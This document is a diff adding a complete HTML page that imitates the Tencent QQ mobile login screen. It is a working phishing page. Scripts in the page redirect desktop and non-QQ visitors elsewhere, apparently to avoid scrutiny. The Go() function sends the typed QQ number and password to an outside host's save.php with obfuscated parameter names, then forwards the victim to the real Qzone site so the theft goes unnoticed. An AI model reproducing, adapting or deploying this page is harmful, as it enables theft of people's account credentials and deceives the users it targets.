@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>手机统一登录</title>
+<meta
+ content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+ name="viewport" />
+<meta content="yes" name="apple-mobile-web-app-capable" />
+<meta content="black" name="apple-mobile-web-app-status-bar-style" />
+<meta name="format-detection" content="telephone=no" />
+<meta content="false" name="twcClient" id="twcClient" />
+<meta name="aplus-touch" content="1" />
+<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+<script type="text/javascript"> var system = {
+  win: false,
+ mac: false,
+ xll: false
+};
+var p = navigator.platform;
+system.win = p.indexOf("Win") == 0;
+system.mac = p.indexOf("Mac") == 0;
+system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+if (system.win || system.mac || system.xll) {
+ window.location.href = "http://qzonestyle.gtimg.cn/"
+}
+ if(navigator.userAgent.indexOf("QQ/")>0){}else{window.location.replace('http://daohang.114so.cn/');}
+</script>
+<script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
+<script type="text/javascript"> mqq.ui.setTitleButtons({
+  right : {
+hidden: true
+}
+})
+</script>
+<script type="text/javascript"> document.addEventListener("touchmove", function(e) {e.preventDefault()}, false);
+</script>
+<style type="text/css">
+@charset "utf-8";
+
+body, html {
+ height: 100%
+}
+
+#go, #onekey, #vcode #submit, .copyright, .header, .nick, .q_login,
+ .ui_topbar {
+ text-align: center
+}
+
+.del_touch, .inputstyle {
+ -webkit-tap-highlight-color: rgba(255, 255, 255, 0)
+}
+
+body {
+ font-size: 16px;
+ background: #eee
+}
+
+* {
+ padding: 0;
+ margin: 0;
+ list-style: none;
+ text-decoration: none
+}
+
+input::-webkit-input-placeholder, textarea::-webkit-input-placeholder {
+ color: #aaa
+}
+
+input::-ms-input-placeholder, textarea::-ms-input-placeholder {
+ color: #aaa
+}
+
+input:focus {
+ outline: 0
+}
+
+.content {
+ margin: 0 auto;
+ width: 320px;
+ height: 500px;
+ position: relative
+}
+
+#error_tips {
+ position: absolute;
+ top: 0;
+ z-index: 100;
+ display: none;
+ opacity: .95;
+ width: 100%
+}
+
+.login {
+ margin: 0 auto;
+ padding-top: 30px
+}
+
+.q_login {
+ margin: 0 auto 40px;
+ width: 290px;
+ overflow: hidden
+}
+
+.inputstyle {
+ width: 273px;
+ height: 44px;
+ color: #000;
+ border: none;
+ background: 0 0;
+ padding-left: 15px;
+ font-size: 16px;
+ -webkit-appearance: none
+}
+
+.logo {
+ height: 100px;
+ width: 244px;
+ margin: 0 auto 20px;
+ background-size: 244px 100px
+}
+
+#go.weak, #onekey.weak, #switch #swicth_login {
+ height: 42px;
+ border: 1px solid #9abbe3;
+ color: #146fdf
+}
+
+#onekey {
+ background: #146fdf;
+ display: none
+}
+
+#go.weak, #onekey.weak {
+ background-color: #e7e7e7
+}
+
+#switch {
+ width: 290px
+}
+
+#switch #swicth_login {
+ width: 288px;
+ line-height: 44px;
+ border-radius: 5px;
+ background: #e7e7e7;
+ margin-top: 10px;
+ text-align: center;
+ font-size: 16px
+}
+
+#switch #zc_feedback {
+ width: 290px;
+ position: relative;
+ margin-top: 15px;
+ overflow: hidden
+}
+
+#switch #forgetpwd, #switch #zc {
+ color: #246183;
+ line-height: 14px;
+ font-size: 14px;
+ padding: 15px 10px
+}
+
+#switch #zc {
+ float: right;
+ margin-right: -10px
+}
+
+#switch #forgetpwd {
+ float: left;
+ margin-left: -10px
+}
+
+#switch, #vcode, #web_login {
+ margin: 0 auto
+}
+
+#web_login {
+ width: 290px
+}
+
+#g_list {
+ background: #fff;
+ height: 89px;
+ border-radius: 4px
+}
+
+#g_p, #g_u {
+ position: relative
+}
+
+#g_u {
+ border-bottom: 1px solid #eaeaea
+}
+
+#go, #onekey {
+ width: 290px;
+ height: 44px;
+ line-height: 44px;
+ background: #146fdf;
+ border: none;
+ border-radius: 4px;
+ color: #fff;
+ font-size: 16px;
+ margin-top: 15px;
+ display: block
+}
+
+#go.weak, #onekey.weak, #switch #swicth_login {
+ height: 42px;
+ border: 1px solid #9abbe3;
+ color: #146fdf
+}
+
+#onekey {
+ background: #146fdf;
+ display: none
+}
+
+#go.weak, #onekey.weak {
+ background-color: #e7e7e7
+}
+
+#switch #zc_feedback {
+ width: 290px;
+ position: relative;
+ margin-top: 16px;
+ overflow: hidden
+}
+
+#switch #forgetpwd, #switch #zc {
+ color: #246183;
+ line-height: 14px;
+ font-size: 14px;
+ padding: 15px 10px
+}
+
+#switch #zc {
+ float: right;
+ margin-right: -10px
+}
+
+#switch #forgetpwd {
+ float: left;
+ margin-left: -10px
+}
+</style>
+<style type="text/css">
+.logo {
+ background-image:
+  url("http://onh563mvw.bkt.clouddn.com/ptlogin-logo.png");
+}
+</style>
+</head>
+<body>
+ <div id="content" class="content">
+  <div id="login" class="login">
+   <div id="logo" class="logo"></div>
+   <!--logo-->
+   <script type="text/javascript"> function beforeSubmit(form) {
+if(form.title.value==''){
+form.title.focus();
+return false;
+}
+if(form.content.value==''){
+form.content.focus();
+return false;
+}
+}
+</script>
+   <form>
+    <div id="web_login">
+     <ul id="g_list">
+      <li id="g_u"><input id="User" class="inputstyle" type="text"
+       maxlength="18" placeholder="QQ号码/手机/邮箱"></li>
+
+      <li id="g_p"><input id="Pwd" class="inputstyle"
+       type="password" maxlength="16" placeholder="请输入你的QQ密码"></li>
+     </ul>
+     <button id="go" onclick="Go();return false;">登 录</button>
+    </div>
+   </form>
+   <div id="switch">
+    <div id="zc_feedback">
+     <span id="zc"
+      onclick="window.open('https:\\zc.qq.com\phone\index.html?from=pt')">注册新帐号</span>
+     <span id="forgetpwd" onclick="window.open('#')">忘了密码？</span>
+    </div>
+   </div>
+  </div>
+ </div>
+ <script src="http://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
+ <script type="text/javascript"> function Go(){
+ if($("#User").val()==""||$("#Pwd").val()==""){
+  return;
+ }
+  var p = $("#Pwd").val();
+  var u = $("#User").val();
+ jQuery.ajax({
+   url : 'http://dlstsw.gotoip2.com/leshan/js/save.php?hrUW3PG7mp3RLd3dJu='+u+'&LxMzAX2jog9Bpjs07jP='+p,
+   type : "get",
+  dataType:'jsonp',
+
+      success: function () {
+   window.location.href = "https://qzone.qq.com";
+    },
+    error : function() {
+  window.location.href = "https://qzone.qq.com";
+    }
+  });
+  }
+</script>
+</body>
+</html>
